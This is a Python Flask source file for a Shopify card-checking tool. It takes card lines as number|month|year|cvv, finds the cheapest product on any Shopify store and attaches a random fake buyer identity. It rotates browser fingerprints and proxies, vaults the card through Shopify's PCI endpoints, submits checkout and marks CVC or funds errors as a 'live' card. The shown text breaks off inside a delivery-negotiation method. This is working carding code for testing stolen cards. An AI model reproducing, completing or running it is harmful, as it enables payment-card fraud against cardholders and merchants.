# -*- coding: utf-8 -*-
# Shopify Checkout API — Fixed Production Version (June 2026)
# Supports all 66 PaymentErrorCode values from Shopify's current schema
# Fixes: try/except on all HTTP calls, GraphQL URL, delivery negotiation,
#        buyerIdentity structure, CAPTCHA detection, proxy/site validation

import uuid
import requests
import random
import json
import time
import re
from urllib.parse import urlparse
from flask import Flask, request, jsonify

app = Flask(__name__)

# ── User-Agent pool (Chrome 131-133, June 2026) ─────────────────────────────
_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]
_CH_UA_POOL = [
    '"Chromium";v="133", "Google Chrome";v="133", "Not-A.Brand";v="99"',
    '"Chromium";v="132", "Google Chrome";v="132", "Not-A.Brand";v="99"',
    '"Chromium";v="131", "Google Chrome";v="131", "Not-A.Brand";v="99"',
]
_PLATFORM_POOL = ['"Windows"', '"macOS"']

# PCI vault endpoints — tried in order until one succeeds
_VAULT_ENDPOINTS = [
    "https://deposit.us.shopifycs.com/sessions",
    "https://checkout.pci.shopifyinc.com/sessions",
    "https://checkout.shopifycs.com/sessions",
]

# All 66 PaymentErrorCode descriptions from Shopify's current schema
ERROR_DESCRIPTIONS = {
    "INCORRECT_NUMBER": "Card number does not comply with ISO/IEC 7812 numbering standard",
    "INVALID_NUMBER": "Card number was not matched by processor",
    "INVALID_EXPIRY_DATE": "Expiry date does not match correct formatting",
    "INVALID_CVC": "Security code does not match correct format (3-4 digits)",
    "EXPIRED_CARD": "Card number is expired",
    "INCORRECT_CVC": "Security code was not matched by the processor",
    "INCORRECT_ZIP": "Zip code is not in correct format",
    "INCORRECT_ADDRESS": "Billing address info was not matched by the processor",
    "INCORRECT_PIN": "Card PIN is incorrect",
    "NAME_MISMATCH": "Name on card and billing address don't match",
    "CARD_DECLINED": "Card number declined by processor",
    "PROCESSING_ERROR": "Processor error",
    "CALL_ISSUER": "Transaction requires voice authentication, call issuer",
    "PICK_UP_CARD": "Issuer requests that you pick up the card from the merchant",
    "CONFIG_ERROR": "Error in gateway or merchant configuration",
    "TEST_MODE_LIVE_CARD": "Card declined — request was in test mode but used a non-test card",
    "UNSUPPORTED_FEATURE": "Gateway or merchant configuration does not support a feature used",
    "GENERIC_ERROR": "Unknown error during payment processing",
    "TRANSIENT_ERROR": "Infrastructure problem such as network or database connectivity",
    "GIFT_CARD_ERROR": "Error processing gift card payment",
    "REDEEMABLE_DISABLED": "The redeemable is disabled",
    "CUSTOM_REDEEMABLE_NO_LONGER_AVAILABLE": "Redeemable no longer available due to checkout change",
    "PAYMENT_METHOD_EXPIRED": "Payment method has expired",
    "AUTHENTICATION_ERROR": "Error during authentication",
    "AUTHORIZATION_ERROR": "Error during authorization",
    "UNKNOWN_PAYMENT_ERROR": "Unknown error during payment processing",
    "INVALID_PAYMENT_ERROR": "Invalid payment error during processing",
    "PUBLIC_PAYMENT_ERROR": "Payment could not be completed due to payment error",
    "UNPROCESSABLE_TRANSACTION": "Encountered an unprocessable transaction",
    "GATEWAY_NOT_ENABLED_ERROR": "Payment gateway is not enabled",
    "PAYPAL_RESTRICATED_ACCOUNT_GATEWAY": "Merchant's PayPal account is restricted",
    "MISSING_SHIPPING_ADDRESS": "Shipping address missing",
    "INVALID_SHIPPING_ADDRESS": "Shipping address is invalid",
    "FUNDING_ERROR": "Funding source failed",
    "UNILATERAL_AUTH_ERROR": "Unilateral accounts cannot do auth/capture, must do a sale",
    "INSUFFICIENT_FUNDS": "Customer account has insufficient funds",
    "INVALID_PAYMENT_METHOD": "Invalid payment method",
    "CANCELED_PAYPAL_BILLING_AGREEMENT": "PayPal billing agreement cancelled",
    "OFF_SESSION_REJECTED": "3DS off-session rejected",
    "AUTHENTICATION_REQUIRED": "Payment requires authentication",
    "TOKEN_EXPIRED": "Session expired — token no longer valid",
    "INVALID_TOKEN": "Token is invalid",
    "OAUTH_TOKEN_ERROR": "Unable to update OAuth token",
    "SUCCESSFUL_OFFSITE_WITH_GIFT_CARD_ERROR": "Offsite payment successful but gift card failed",
    "INVALID_BILLING_AGREEMENT_OR_TRANSACTION": "Billing agreement or transaction ID is invalid",
    "INVOICE_ALREADY_PAID": "Payment already made for this invoice",
    "INVALID_ITEM_TOTAL": "ItemTotal amount is not valid",
    "THIRD_PARTY_INTERNAL_ERROR": "Internal error on third party system",
    "INVALID_CURRENCY": "Transaction currency differs from previously specified",
    "CUSTOMER_NOT_FOUND": "Customer was not found",
    "CUSTOMER_IDENTIFIER_MISSING": "Customer identifier (email/phone) was missing",
    "AMOUNT_TOO_SMALL": "Transaction amount is too small",
    "PRE_CHARGE_ERROR": "Error validating payment information",
    "CONFIRMATION_REJECTED": "Shopify rejected the payment confirmation",
    "FRAUD_SUSPECTED": "Error that suggests fraud",
    "NO_ACCOUNT": "No account found for the payment provided",
    "INVALID_PURCHASE_TYPE": "Payment method not authorized for this purchase type",
    "PAYPAL_ERROR_GENERAL": "General PayPal error",
    "PAYMENT_ABOVE_THRESHOLD": "Payment amount above threshold for the region",
    "RISKY": "Payment rejected by risk control",
    "SHOP_PAY_DECLINED": "Payment declined by Shop Pay",
    "EXPIRED_BUYER_ACTION": "Buyer action has expired",
    "MOTO_TRANSACTIONS_BLOCKED": "MOTO transactions blocked for this merchant",
    "CANCELLED_PAYMENT": "Payment was cancelled",
    "CAPTCHA_REQUIRED": "Captcha required",
    "DECISION_RULE_BLOCK": "Declined due to decision rule block",
    "CVV_ATTEMPTS_EXCEEDED": "Too many failed CVV verification attempts",
    "INVALID_AMOUNT": "Amount too high or too low for provider",
    "INVALID_COUNTRY": "Payment method not available in customer's country",
    "PAYMENT_METHOD_UNAVAILABLE": "Payment method momentarily unavailable",
    "THREE_D_SECURE_FAILED": "3D Secure check failed",
}

# Error codes that indicate card was VALIDATED by the gateway (treat as Approved)
_APPROVAL_CODES = frozenset({
    "INSUFFICIENT_FUNDS", "INCORRECT_CVC", "INVALID_CVC",
    "INCORRECT_ZIP", "INCORRECT_ADDRESS", "CALL_ISSUER",
    "INCORRECT_PIN", "NAME_MISMATCH", "EXPIRED_CARD",
    "AUTHENTICATION_REQUIRED", "OFF_SESSION_REJECTED",
})

# Error codes that indicate card was DECLINED
_DECLINE_CODES = frozenset({
    "CARD_DECLINED", "GENERIC_ERROR", "PROCESSING_ERROR", "FRAUD_SUSPECTED",
    "RISKY", "DECISION_RULE_BLOCK", "PICK_UP_CARD", "NO_ACCOUNT",
    "INVALID_NUMBER", "INCORRECT_NUMBER",
})

# Error codes that indicate the SITE is incompatible (skip silently)
_SITE_SKIP_CODES = frozenset({
    "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP",
    "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE",
    "PAYMENTS_INVALID_GATEWAY_FOR_DEVELOPMENT_STORE",
    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE",
    "REQUIRED_ARTIFACTS_UNAVAILABLE",
    "GATEWAY_NOT_ENABLED_ERROR",
})

# Delivery-related error codes that trigger negotiation retry
_DELIVERY_ERROR_CODES = frozenset({
    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE",
})


# ── Module-level helpers ─────────────────────────────────────────────────────

def format_proxy(proxy_string):
    """
    Convert any common proxy format to a requests-compatible URL string.

    Accepted inputs:
      ip:port
      ip:port:user:pass
      user:pass@ip:port
      http://user:pass@ip:port
      socks5://ip:port
      (blank / None → returns None)
    """
    if not proxy_string:
        return None
    s = str(proxy_string).strip()
    if not s:
        return None
    # Already a full URL
    if s.startswith(("http://", "https://", "socks4://", "socks5://")):
        return s
    # user:pass@host:port
    if "@" in s:
        return f"http://{s}"
    # host:port:user:pass  (4 parts)
    parts = s.split(":")
    if len(parts) >= 4:
        host, port = parts[0], parts[1]
        user = ":".join(parts[2:-1])
        pwd  = parts[-1]
        if port.isdigit():
            return f"http://{user}:{pwd}@{host}:{port}"
    # host:port  (2 parts)
    if len(parts) == 2 and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    return None


def _rand_ua():       return random.choice(_UA_POOL)
def _rand_ch_ua():    return random.choice(_CH_UA_POOL)
def _rand_platform(): return random.choice(_PLATFORM_POOL)


# ── ShopifyChecker ───────────────────────────────────────────────────────────

class ShopifyChecker:

    # ── GraphQL queries ──────────────────────────────────────────────────────

    # Updated SubmitForCompletion mutation — includes deliveryLines in receipts
    # so we can extract the delivery handle after negotiation.
    SUBMIT_MUTATION = (
        "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
        "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
        "$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken "
        "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
        "analytics:$analytics){"
        "...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
        "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
        "...on SubmitFailed{reason __typename}"
        "...on SubmitRejected{errors{"
        "...on NegotiationError{code localizedMessage __typename}"
        "...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}"
        "__typename}__typename}"
        "...on Throttled{pollAfter pollUrl queueToken __typename}"
        "...on CheckpointDenied{redirectUrl __typename}"
        "...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}"
        "...on TooManyAttempts{__typename}"
        "...on TooManyRequests{__typename}"
        "__typename}}"
        "fragment ReceiptDetails on Receipt{"
        "...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}"
        "...on ProcessingReceipt{id pollDelay "
        "deliveryLines{selectedDeliveryStrategy{handle __typename}__typename}"
        "__typename}"
        "...on ActionRequiredReceipt{id action{"
        "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
        "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
        "__typename}timeout{millisecondsRemaining __typename}__typename}"
        "...on FailedReceipt{id processingError{"
        "...on PaymentFailed{code hasOffsitePaymentMethod __typename}__typename}__typename}"
        "...on WaitingReceipt{pollDelay __typename}"
        "...on ReceiptNotFound{__typename}"
        "__typename}"
    )

    # Updated PollForReceipt query — includes ActionRequiredReceipt v2 fields
    POLL_QUERY = (
        "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
        "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
        "...ReceiptDetails __typename}}"
        "fragment ReceiptDetails on Receipt{"
        "...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}"
        "...on ProcessingReceipt{id pollDelay __typename}"
        "...on ActionRequiredReceipt{id action{"
        "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
        "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
        "__typename}timeout{millisecondsRemaining __typename}__typename}"
        "...on FailedReceipt{id processingError{"
        "...on PaymentFailed{code hasOffsitePaymentMethod __typename}__typename}__typename}"
        "...on WaitingReceipt{pollDelay __typename}"
        "...on ReceiptNotFound{__typename}"
        "__typename}"
    )

    # ── init ─────────────────────────────────────────────────────────────────

    def __init__(self, base_url, proxy=None):
        self.session = requests.Session()
        self.session.verify = False  # some stores have self-signed / expired certs
        if proxy:
            p = format_proxy(proxy)
            if p:
                self.session.proxies = {"http": p, "https": p}
        self.base_url = base_url.strip().rstrip("/")
        if not self.base_url.startswith("http"):
            self.base_url = "https://" + self.base_url

        _ua  = _rand_ua()
        _cua = _rand_ch_ua()
        _pf  = _rand_platform()
        self.headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "priority": "u=1, i",
            "sec-ch-ua": _cua,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": _pf,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": _ua,
        }
        # State populated during checkout flow
        self.checkout_id          = None
        self.variant_id           = None
        self.product_id           = None
        self.requires_shipping    = True   # updated by find_cheapest_product
        self.product_price        = None
        self.checkout_url         = None
        self.session_token        = None
        self.signature            = None
        self.stable_id            = None
        self.queue_token          = None
        self.client_id            = None
        self.visit_token          = None
        self.shop_id              = None
        self.cart_token           = None
        self.payment_method_identifier = None
        self.signed_handles       = []
        self.graphql_base         = None
        self.build_id             = None
        self.pci_build_hash       = "a8e4a94"

    # ── internal helpers ─────────────────────────────────────────────────────

    def _graphql_url(self):
        """Return the correct GraphQL endpoint for this checkout."""
        return f"{self.graphql_base}/checkouts/unstable/graphql"

    def _graphql_headers(self, streaming="yes"):
        """Build the standard GraphQL request headers."""
        h = self.headers.copy()
        h.update({
            "accept":                        "application/json",
            "content-type":                  "application/json",
            "origin":                        self.base_url,
            "referer":                       self.checkout_url or self.base_url,
            "shopify-checkout-client":       "checkout-web/1.0",
            "shopify-checkout-source":       f'id="{self.checkout_id}", type="cn"',
            "x-checkout-one-session-token":  self.session_token,
            "x-checkout-web-deploy-stage":   "production",
            "x-checkout-web-server-handling":"fast",
            "x-checkout-web-server-rendering": streaming,
            "x-checkout-web-source-id":      self.checkout_id,
            "x-checkout-web-build-id":       self.build_id or "",
        })
        return h

    def _street_address(self, addr):
        """Return a flat street-address dict compatible with Shopify's GraphQL input."""
        return {
            "address1":    addr["address1"],
            "address2":    "",
            "city":        addr["city"],
            "countryCode": "US",
            "postalCode":  addr["postalCode"],
            "company":     "",
            "firstName":   addr["firstName"],
            "lastName":    addr["lastName"],
            "zoneCode":    addr["zoneCode"],
            "phone":       addr["phone"],
        }

    def _random_address(self):
        fn = random.choice(["James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda","David","Susan"])
        ln = random.choice(["Smith","Jones","Taylor","Brown","Williams","Wilson","Johnson","Davies","Miller","Davis"])
        st = f"{random.randint(100,9999)} {random.choice(['Maple St','Oak Ave','Washington Blvd','Lakeview Dr','Park Way','Broadway','Elm St','Pine Ave'])}"
        city, state, zp = random.choice([
            ("Los Angeles","CA","90001"),("New York","NY","10001"),
            ("Houston","TX","77001"),("Miami","FL","33101"),
            ("Chicago","IL","60601"),("Phoenix","AZ","85001"),
            ("Seattle","WA","98101"),
        ])
        return {
            "firstName": fn, "lastName": ln, "address1": st,
            "city": city, "zoneCode": state, "postalCode": zp,
            "countryCode": "US",
            "phone": f"+1703{random.randint(210,999)}{random.randint(1000,9999)}",
        }

    def _build_delivery_payload(self, addr, destination_changed=True,
                                delivery_handle=None):
        """
        Build the `delivery` dict for NegotiationInput.

        - Non-shipping products: deliveryLines empty, stableId in noDeliveryRequired.
        - Physical products, first attempt (destination_changed=True):
            send with deliveryStrategyMatchingConditions — Shopify picks the best rate.
        - Physical products, retry with negotiated handle:
            send with the explicit handle.
        """
        if not self.requires_shipping:
            return {
                "deliveryLines":              [],
                "noDeliveryRequired":         [{"stableId": self.stable_id}],
                "useProgressiveRates":        False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping":      True,
            }

        sa = self._street_address(addr)
        destination = {"streetAddress": {**sa, "oneTimeUse": False}}

        if delivery_handle:
            selected = {"handle": delivery_handle}
        else:
            selected = {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments":              {"any": True},
                },
                "options": {"phone": addr["phone"]},
            }

        return {
            "deliveryLines": [{
                "destination":              destination,
                "selectedDeliveryStrategy": selected,
                "targetMerchandiseLines":   {"lines": [{"stableId": self.stable_id}]},
                "deliveryMethodTypes":      ["SHIPPING"],
                "expectedTotalPrice":       {"any": True},
                "destinationChanged":       destination_changed,
            }],
            "noDeliveryRequired":         [],
            "useProgressiveRates":        False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping":      True,
        }

    def _build_submit_payload(self, vault_id, addr, email, attempt_token,
                              delivery_handle=None, destination_changed=True):
        """Assemble the full SubmitForCompletion payload."""
        sa = self._street_address(addr)
        dl = [{"signedHandle": sh} for sh in self.signed_handles]

        payload = {
            "query":         self.SUBMIT_MUTATION,
            "operationName": "SubmitForCompletion",
            "variables": {
                "attemptToken": attempt_token,
                "metafields":   [],
                "analytics": {
                    "requestUrl": self.checkout_url,
                    "pageId":     str(uuid.uuid4()).upper(),
                },
                "input": {
                    "checkpointData": None,
                    "sessionInput":   {"sessionToken": self.session_token},
                    "queueToken":     self.queue_token,
                    "discounts":      {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery":       self._build_delivery_payload(
                                          addr,
                                          destination_changed=destination_changed,
                                          delivery_handle=delivery_handle,
                                      ),
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId":   self.stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id":        f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                    "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                    "properties":       [],
                                    "sellingPlanId":    None,
                                    "sellingPlanDigest":None,
                                },
                            },
                            "quantity":              {"items": {"value": 1}},
                            "expectedTotalPrice":    {"any": True},
                            "lineComponentsSource":  None,
                            "lineComponents":        [],
                        }],
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": self.payment_method_identifier or vault_id,
                                    "sessionId":    vault_id,
                                    "billingAddress": {"streetAddress": sa},
                                    "cardSource":   None,
                                },
                            },
                            "amount": {"any": True},
                        }],
                        "billingAddress": {"streetAddress": sa},
                        "creditCardBin":  vault_id[:8] if vault_id else "",
                    },
                    "buyerIdentity": {
                        "customer":      {"presentmentCurrency": "USD", "countryCode": "US"},
                        "email":         email,
                        "emailChanged":  False,
                        "phoneCountryCode": "US",
                        "marketingConsent": [
                            {"sms":   {"consentState": "DECLINED",
                                       "value": addr["phone"], "countryCode": "US"}},
                            {"email": {"consentState": "GRANTED", "value": email}},
                        ],
                        "shopPayOptInPhone": {"number": addr["phone"], "countryCode": "US"},
                        "rememberMe":              False,
                        "setShippingAddressAsDefault": False,
                    },
                    "tip":  {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"any": True},
                        "proposedTotalIncludedAmount":  None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges":    [],
                        "paymentScriptChanges":     [],
                        "shippingScriptChanges":    [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "captcha":       None,
                    "cartMetafields": [],
                },
            },
        }

        # Attach deliveryExpectations only when the store provided signedHandles
        if dl:
            payload["variables"]["input"]["deliveryExpectations"] = {
                "deliveryExpectationLines": dl,
            }

        return payload

    # ── step 1: session ──────────────────────────────────────────────────────

    def init_session(self):
        try:
            r = self.session.get(
                f"{self.base_url}/cart.js", headers=self.headers, timeout=15
            )
            if r.status_code not in (200, 302):
                return False
        except Exception:
            return False
        self.client_id  = (self.session.cookies.get("_shopify_y")
                           or self.session.cookies.get("shopify_client_id")
                           or str(uuid.uuid4()))
        self.visit_token = (self.session.cookies.get("_shopify_s")
                            or str(uuid.uuid4()))
        try:
            self.cart_token = r.json().get("token", "")
        except Exception:
            self.cart_token = ""
        return True

    # ── step 2: find product ─────────────────────────────────────────────────

    def find_cheapest_product(self, min_price=0.5, max_price=200.0):
        """
        Find the cheapest available product within the price range.
        Uses limit=250 to cover stores with large catalogs.
        Returns False when no suitable product is found.
        """
        try:
            r = self.session.get(
                f"{self.base_url}/products.json",
                params={"limit": 250},
                headers=self.headers,
                timeout=15,
            )
            products = r.json().get("products", [])
        except Exception:
            return False

        best_price = float("inf")
        best = None

        for p in products:
            for v in p.get("variants", []):
                # available can be bool (from JSON) or string — normalise both
                avail = v.get("available", False)
                if isinstance(avail, str):
                    avail = avail.lower() in ("true", "1", "yes")
                if not avail:
                    continue
                try:
                    price_val = float(str(v.get("price", "0")).replace(",", "").strip())
                except (ValueError, TypeError):
                    continue
                if price_val < min_price or price_val > max_price:
                    continue
                if price_val < best_price:
                    best_price = price_val
                    best = v
                    self.product_id = p["id"]
                    # Track whether this variant needs shipping
                    req_ship = v.get("requires_shipping", True)
                    if isinstance(req_ship, str):
                        req_ship = req_ship.lower() not in ("false", "0", "no")
                    self.requires_shipping = bool(req_ship)

        if best:
            self.variant_id    = best["id"]
            self.product_price = best_price
            return True
        return False

    # ── step 3: add to cart ──────────────────────────────────────────────────

    def add_to_cart(self):
        h = self.headers.copy()
        h.update({
            "content-type":    "application/x-www-form-urlencoded; charset=UTF-8",
            "accept":          "application/json, text/javascript, */*; q=0.01",
            "x-requested-with":"XMLHttpRequest",
            "origin":          self.base_url,
        })
        try:
            r = self.session.post(
                f"{self.base_url}/cart/add.js",
                data={"id": self.variant_id, "quantity": 1,
                      "form_type": "product", "utf8": "\u2713"},
                headers=h,
                timeout=15,
            )
            if r.status_code == 200:
                try:
                    self.cart_token = r.json().get("cart_token", self.cart_token)
                except Exception:
                    pass
                return True
            return False
        except Exception:
            return False

    # ── step 4: telemetry ────────────────────────────────────────────────────

    def _monorail(self):
        url = f"{self.base_url}/.well-known/shopify/monorail/unstable/produce_batch"
        h = self.headers.copy()
        h.update({
            "content-type": "text/plain;charset=UTF-8",
            "origin":       self.base_url,
            "priority":     "u=4, i",
            "sec-fetch-mode":"no-cors",
        })
        now  = int(time.time() * 1000)
        body = {
            "events": [{
                "schema_id": "storefront_customer_tracking/4.27",
                "payload": {
                    "api_client_id":  580111,
                    "event_id":       f"sh-{str(uuid.uuid4()).upper()[:23]}",
                    "event_name":     "product_added_to_cart",
                    "shop_id":        int(self.shop_id or 0),
                    "total_value":    47,
                    "currency":       "USD",
                    "event_time":     now,
                    "event_source_url": self.checkout_url or self.base_url,
                    "unique_token":   self.client_id,
                    "page_id":        str(uuid.uuid4()).upper(),
                    "source":         "trekkie-storefront-renderer",
                    "ccpa_enforced":  True,
                    "gdpr_enforced":  False,
                    "is_persistent_cookie":  True,
                    "analytics_allowed":     True,
                    "marketing_allowed":     True,
                    "sale_of_data_allowed":  False,
                    "preferences_allowed":   True,
                    "shopify_emitted":       True,
                },
                "metadata": {"event_created_at_ms": now},
            }],
            "metadata": {"event_sent_at_ms": now},
        }
        try:
            self.session.post(url, data=json.dumps(body), headers=h, timeout=5)
        except Exception:
            pass

    # ── step 5: start checkout ───────────────────────────────────────────────

    def start_checkout(self):
        h = self.headers.copy()
        h.update({
            "accept":                  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "content-type":            "application/x-www-form-urlencoded",
            "cache-control":           "max-age=0",
            "origin":                  self.base_url,
            "referer":                 f"{self.base_url}/cart",
            "sec-fetch-dest":          "document",
            "sec-fetch-mode":          "navigate",
            "sec-fetch-user":          "?1",
            "upgrade-insecure-requests":"1",
        })
        try:
            r = self.session.post(
                f"{self.base_url}/cart",
                data=f"updates%5B%5D=1&checkout=&cart_token={self.cart_token or ''}",
                headers=h,
                allow_redirects=True,
                timeout=20,
            )
        except Exception:
            return False
        self.checkout_url = str(r.url)
        m = re.search(r"/checkouts/(?:cn/)?([a-zA-Z0-9]+)", self.checkout_url)
        if m:
            self.checkout_id = m.group(1)
            return True
        return False

    # ── step 6: extract tokens ───────────────────────────────────────────────

    def extract_tokens(self):
        h = self.headers.copy()
        h.update({
            "accept":                  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "sec-fetch-dest":          "document",
            "sec-fetch-mode":          "navigate",
            "upgrade-insecure-requests":"1",
        })
        try:
            r = self.session.get(self.checkout_url, headers=h, timeout=20)
            html = r.text
        except Exception:
            return False

        # Session token — try multiple patterns
        self.session_token = None
        for pat in [
            r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
            r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
            r"'sessionToken'\s*:\s*'(AAEB[^']+)'",
            r'(AAEB[A-Za-z0-9_\-]{30,})',
        ]:
            m = re.search(pat, html)
            if m:
                self.session_token = m.group(1)
                break

        # Signature (payment request identification)
        self.signature = None
        for pat in [
            r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"paymentsSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"signature"\s*:\s*"(eyJ[^"]+)"',
        ]:
            m = re.search(pat, html)
            if m:
                self.signature = m.group(1)
                break

        # Stable ID
        m = re.search(
            r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
            html,
        )
        self.stable_id = m.group(1) if m else str(uuid.uuid4())

        # Queue token
        m = (re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html)
             or re.search(r'"queueToken"\s*:\s*"([^"]+)"', html))
        self.queue_token = m.group(1) if m else None

        # Payment method identifier
        m = (re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html)
             or re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', html))
        self.payment_method_identifier = m.group(1) if m else None

        # Shop ID
        self.shop_id = "0"
        for pat in [r'"shopId"\s*:\s*(\d+)', r'shop_id[\s:=]+(\d+)',
                    r'Shopify\.shop\s*=\s*"(\d+)"', r'"shop_id":\s*(\d+)']:
            m = re.search(pat, html)
            if m and m.group(1) != "0":
                self.shop_id = m.group(1)
                break

        # Build ID
        m = (re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', html)
             or re.search(r'/build/([a-f0-9]{40})/', html))
        self.build_id = m.group(1) if m else "0000000000000000000000000000000000000000"

        # PCI build hash
        m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
        self.pci_build_hash = m.group(1) if m else "a8e4a94"

        # Signed handles (delivery strategy tokens from the store)
        self.signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html)
        if not self.signed_handles:
            raw = re.findall(r'\\"signedHandle\\":\\"([^\\"]+)', html)
            self.signed_handles = [h2.replace("\\n", "").replace("\\r", "")
                                   for h2 in raw]

        # GraphQL base — always use the checkout URL's host (authoritative)
        parsed = urlparse(self.checkout_url)
        self.graphql_base = f"{parsed.scheme}://{parsed.netloc}"

        return bool(self.session_token)

    # ── step 7: vault card ───────────────────────────────────────────────────

    def vault_card(self, cc_line):
        """
        Submit card to Shopify's PCI vault. Tries all known vault endpoints
        in order and returns (session_id, addr) or (None, addr) on failure.
        """
        parts = cc_line.strip().split("|")
        if len(parts) != 4:
            return None, None
        card_num, month, year, cvv = [p.strip() for p in parts]
        addr = self._random_address()

        h = {
            "accept":           "application/json",
            "accept-language":  "en-US,en;q=0.9",
            "content-type":     "application/json",
            "origin":           "https://checkout.pci.shopifyinc.com",
            "referer":          (f"https://checkout.pci.shopifyinc.com/build/"
                                 f"{self.pci_build_hash}/number-ltr.html"
                                 f"?identifier=&locationURL={self.checkout_url or ''}"),
            "sec-ch-ua":        self.headers["sec-ch-ua"],
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": self.headers["sec-ch-ua-platform"],
            "sec-fetch-dest":   "empty",
            "sec-fetch-mode":   "cors",
            "sec-fetch-site":   "same-origin",
            "user-agent":       self.headers["user-agent"],
        }
        if self.signature:
            h["shopify-identification-signature"] = self.signature

        body = {
            "credit_card": {
                "number":             card_num,
                "month":              int(month),
                "year":               int(year),
                "verification_value": cvv,
                "start_month":        None,
                "start_year":         None,
                "issue_number":       "",
                "name":               f"{addr['firstName']} {addr['lastName']}",
            },
            "payment_session_scope": urlparse(self.base_url).netloc,
        }

        for endpoint in _VAULT_ENDPOINTS:
            try:
                r = self.session.post(endpoint, json=body, headers=h, timeout=15)
                if r.status_code in (200, 201):
                    sid = r.json().get("id")
                    if sid:
                        return sid, addr
            except Exception:
                continue

        return None, addr

    # ── step 8a: negotiate delivery (physical products only) ─────────────────

    def _negotiate_delivery(self, vault_id, addr, email, attempt_token):
        """
        Send a first submit with destinationChanged=True and NO selectedDeliveryStrategy
        so Shopify calculates shipping rates.  Returns the delivery handle string
        (to be used in the main submit) or None if extraction failed.

        If Shopify returns a receipt ID directly (fast-track), also returns it
        under the 'receipt_id' key so the caller can skip the main submit.
        """
        payload = self._build_submit_payload(
            vault_id, addr, email,
            attempt_token=f"{attempt_token}-neg",
            delivery_handle=None,
            destination_changed=True,
        )
        # Remove selectedDeliveryStrategy entirely for pure negotiation
        try:
            dlines = payload["variables"]["input"]["delivery"]["deliveryLines"]
            if dlines:
                dlines[0].pop("selectedDeliveryStrategy", None)
        except (KeyError, IndexError):
            pass

